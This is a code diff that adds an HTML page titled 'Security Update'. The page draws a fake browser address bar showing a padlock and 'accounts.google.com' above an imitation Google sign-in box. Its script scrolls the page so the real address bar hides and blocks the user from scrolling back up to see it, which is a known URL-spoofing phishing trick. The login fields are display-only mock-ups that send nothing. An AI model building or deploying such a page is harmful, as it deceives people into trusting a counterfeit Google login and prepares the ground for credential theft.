@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Security Update</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background: #fff;
+            font-family: 'Roboto', Arial, sans-serif;
+            overscroll-behavior-y: contain; /* Bounce bondho korar jonno */
+        }
+
+        /* FAKE TOP ADDRESS BAR */
+        .fake-address-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 60px;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 1px solid #dfe1e5;
+            z-index: 10000;
+        }
+
+        .url-box {
+            background: #f1f3f4;
+            width: 92%;
+            height: 38px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            padding-left: 15px;
+            font-size: 14px;
+            color: #202124;
+        }
+
+        /* Content Layout */
+        .scroller {
+            height: 350vh; /* Lomba page */
+            padding-top: 100px;
+        }
+
+        .spacer {
+            height: 150vh; /* User-ke scroll korate boddho kora */
+            text-align: center;
+            color: #70757a;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        /* DUMMY LOGIN BOX (Just Design, No Input) */
+        .login-container {
+            padding: 20px;
+            max-width: 380px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .login-box {
+            border: 1px solid #dadce0;
+            padding: 35px 25px;
+            border-radius: 8px;
+            background: #fff;
+        }
+
+        .google-logo {
+            margin-bottom: 10px;
+            font-family: 'Product Sans', Arial, sans-serif;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        /* Dummy Input Styles */
+        .dummy-input {
+            width: 100%;
+            height: 45px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin: 12px 0;
+            text-align: left;
+            padding-left: 12px;
+            line-height: 45px;
+            color: #70757a;
+            font-size: 16px;
+            cursor: default;
+        }
+
+        .next-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border-radius: 4px;
+            font-weight: 500;
+            margin-top: 25px;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="fake-address-bar" id="fakeBar">
+        <div class="url-box">
+            <span style="margin-right: 5px;">🔒</span>
+            <span>accounts.google.com</span>
+        </div>
+    </div>
+
+    <div class="scroller">
+        <div class="spacer">
+            <p>Scanning for security threats...</p>
+            <p style="font-size: 14px; margin-top: 20px;">Please scroll down to complete verification</p>
+            <div style="font-size: 40px; margin-top: 30px;">↓</div>
+        </div>
+
+        <div class="login-container">
+            <div class="login-box">
+                <div class="google-logo">
+                    <span style="color: #4285F4;">G</span><span style="color: #EA4335;">o</span><span style="color: #FBBC05;">o</span><span style="color: #4285F4;">g</span><span style="color: #34A853;">l</span><span style="color: #EA4335;">e</span>
+                </div>
+                <h2 style="font-size: 22px; font-weight: 400; margin-top: 0;">Sign in</h2>
+                <p style="margin-bottom: 30px;">Use your Google Account</p>
+                
+                <div class="dummy-input">Email or phone</div>
+                <div class="dummy-input">Enter your password</div>
+                
+                <div class="next-btn">Next</div>
+            </div>
+            <p style="margin-top: 25px; font-size: 12px; color: #70757a; text-align: left;">English (United States)</p>
+        </div>
+    </div>
+
+    <script>
+        // Smooth scroll adjustment to ensure address bar hides
+        window.onload = () => {
+            // Scroll ektu niche namiye dewa jate logic trigger hoy
+            if(window.scrollY < 10) window.scrollTo(0, 5);
+        };
+
+        // Anti-Reverse Scroll Logic
+        let lastScroll = 0;
+        window.addEventListener('scroll', () => {
+            const currentScroll = window.pageYOffset;
+            
+            // Jodi user ekdom upore tan dey, amra take asol bar-e pouchete badha debo
+            if (currentScroll < 40) {
+                window.scrollTo(0, 50);
+            }
+            lastScroll = currentScroll;
+        });
+
+        // Prevention of pull-to-refresh
+        document.addEventListener('touchmove', function(e) {
+            if (window.scrollY <= 0 && e.touches[0].pageY > 0) {
+                // Prevent scrolling up when at the top
+            }
+        }, { passive: false });
+    </script>
+</body>
+</html>
